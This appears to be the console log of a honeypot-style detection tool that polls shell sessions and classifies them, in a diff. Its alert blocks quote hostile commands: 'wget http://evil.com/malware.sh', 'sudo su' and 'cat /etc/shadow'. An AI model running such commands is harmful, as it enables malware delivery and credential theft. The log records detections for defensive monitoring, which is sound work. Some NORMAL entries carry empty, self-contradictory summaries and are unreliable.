@@ -1,0 +1,1749 @@
+nohup: ignoring input
+[*] Starting Live Adaptive Controller...
+[*] Loop starting...
+[*] Synchronizing with existing logs...
+[*] Waiting for NEW activity...
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 0
+[DEBUG] New events detected for session a9646ed3d97e. Processing...
+[*] Logged NORMAL event for session a9646ed3d97e to normal_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: a9646ed3d97e
+Detected Level : 0 (NORMAL)
+Intent         : Unknown
+Skill Level    : Beginner
+Attack Stage   : Unknown
+RAG Mapping    : N/A
+Summary        : The user executed a command sequence () that indicates suspicious activity, triggering detections: .
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 7, Previous: 3
+[DEBUG] New events detected for session a9646ed3d97e. Processing...
+[*] Logged NORMAL event for session a9646ed3d97e to normal_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: a9646ed3d97e
+Detected Level : 0 (NORMAL)
+Intent         : Unknown
+Skill Level    : Beginner
+Attack Stage   : Unknown
+RAG Mapping    : N/A
+Summary        : The user executed a command sequence () that indicates suspicious activity, triggering detections: .
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 7
+[DEBUG] New events detected for session a9646ed3d97e. Processing...
+[*] Logged MALICIOUS event for session a9646ed3d97e to malicious_alerts.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: a9646ed3d97e
+Detected Level : 3 (MALICIOUS)
+Intent         : Malware Delivery
+Skill Level    : Advanced
+Attack Stage   : Execution
+RAG Mapping    : Ingress Tool Transfer (T1105)
+Summary        : The user executed a command sequence ('ls; wget http://evil.com/malware.sh; sudo su; cat /etc/shadow; sleep 5; ls; uname -r') that matches Ingress Tool Transfer (T1105) behavior, triggering detections: Malware Download Attempt.
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 0
+[DEBUG] New events detected for session be4c65b86df8. Processing...
+[*] Logged NORMAL event for session be4c65b86df8 to normal_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: be4c65b86df8
+Detected Level : 0 (NORMAL)
+Intent         : Unknown
+Skill Level    : Beginner
+Attack Stage   : Unknown
+RAG Mapping    : N/A
+Summary        : The user executed a command sequence () that indicates suspicious activity, triggering detections: .
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 3, Previous: 3
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 7, Previous: 3
+[DEBUG] New events detected for session be4c65b86df8. Processing...
+[*] Logged NORMAL event for session be4c65b86df8 to normal_activity.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: be4c65b86df8
+Detected Level : 0 (NORMAL)
+Intent         : [None]
+Skill Level    : [Beginner]
+Attack Stage   : [none]
+RAG Mapping    : N/A
+Summary        : The user executed a command sequence () that indicates suspicious activity, triggering detections: .
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 7, Previous: 7
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 7
+[DEBUG] New events detected for session be4c65b86df8. Processing...
+[*] Logged MALICIOUS event for session be4c65b86df8 to malicious_alerts.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: be4c65b86df8
+Detected Level : 3 (MALICIOUS)
+Intent         : Privilege Escalation
+Skill Level    : Advanced
+Attack Stage   : Privilege Escalation
+RAG Mapping    : Sudo and Sudo Caching (T1548.003)
+Summary        : The user executed a command sequence ('ls; sudo su; cat /etc/shadow; sleep 5; ls; uname -r') that matches Sudo and Sudo Caching (T1548.003) behavior, triggering detections: Privilege Escalation Attempt.
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 8, Previous: 8
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 8
+[DEBUG] New events detected for session a9646ed3d97e. Processing...
+[*] Logged MALICIOUS event for session a9646ed3d97e to malicious_alerts.log
+
+==================================================
+ADAPTIVE INTELLIGENCE FOR SESSION: a9646ed3d97e
+Detected Level : 3 (MALICIOUS)
+Intent         : Malware Delivery
+Skill Level    : Advanced
+Attack Stage   : Execution
+RAG Mapping    : Ingress Tool Transfer (T1105)
+Summary        : The user executed a command sequence ('ls; wget http://evil.com/malware.sh; sudo su; cat /etc/shadow; sleep 5; ls; uname -r') that matches Ingress Tool Transfer (T1105) behavior, triggering detections: Malware Download Attempt.
+Status         : Policy Updated for Live Session
+==================================================
+
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
+[DEBUG] Checking session be4c65b86df8. Current events: 9, Previous: 9
+[DEBUG] Checking session a9646ed3d97e. Current events: 9, Previous: 9
